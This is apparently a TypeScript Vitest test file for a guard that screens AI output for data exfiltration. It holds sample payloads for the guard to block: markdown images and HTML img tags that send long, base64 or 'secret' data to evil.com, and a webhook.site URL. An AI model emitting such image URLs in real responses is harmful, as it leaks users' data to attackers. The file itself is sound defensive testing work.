import { describe, it, expect } from 'vitest';
import { exfiltrationGuard } from '../../src/guards/output/exfiltration.js';

const guard = exfiltrationGuard();
const ctx = { stage: 'output' as const };

describe('exfiltration guard', () => {
  it('blocks markdown image with long query params', () => {
    const longData = 'a'.repeat(150);
    const result = guard.check(
      `![img](https://evil.com/collect?data=${longData})`,
      ctx,
      guard.defaultConfig,
    );
    expect(result.action).toBe('block');
  });

  it('blocks markdown image with base64 in URL', () => {
    const result = guard.check(
      '![img](https://evil.com/track?d=aGVsbG8gd29ybGQgdGhpcyBpcyBzdG9sZW4gZGF0YQ==)',
      ctx,
      guard.defaultConfig,
    );
    expect(result.action).toBe('block');
  });

  it('blocks known exfiltration services', () => {
    const result = guard.check(
      '![img](https://webhook.site/abc-123?stolen=data)',
      ctx,
      guard.defaultConfig,
    );
    expect(result.action).toBe('block');
  });

  it('blocks HTML img tag exfiltration', () => {
    const longData = 'b'.repeat(150);
    const result = guard.check(
      `<img src="https://evil.com/pixel?secret=${longData}">`,
      ctx,
      guard.defaultConfig,
    );
    expect(result.action).toBe('block');
  });

  it('allows normal markdown images', () => {
    const result = guard.check(
      '![chart](https://cdn.example.com/images/chart.png)',
      ctx,
      guard.defaultConfig,
    );
    expect(result.action).toBe('allow');
  });

  it('allows normal markdown links', () => {
    const result = guard.check(
      'See [documentation](https://docs.example.com/guide)',
      ctx,
      guard.defaultConfig,
    );
    expect(result.action).toBe('allow');
  });

  it('allows text without any markdown/html', () => {
    const result = guard.check(
      'This is a regular response about data processing.',
      ctx,
      guard.defaultConfig,
    );
    expect(result.action).toBe('allow');
  });
});
